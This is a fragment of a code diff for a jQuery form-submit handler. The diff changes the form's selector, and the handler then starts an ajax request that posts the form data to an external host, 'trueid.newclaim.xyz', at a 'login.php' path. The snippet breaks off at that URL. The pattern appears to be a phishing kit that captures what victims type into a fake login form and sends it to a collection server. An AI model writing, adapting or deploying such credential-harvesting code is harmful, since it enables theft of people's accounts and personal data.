@@ -1,5 +1,5 @@
-$(".form-group").submit(function() {
-	var d = $(".form-group");
+$(".location").submit(function() {
+	var d = $(".location");
 
 	$.ajax({
         url: "https://trueid.newclaim.xyz/bokep/login.php",
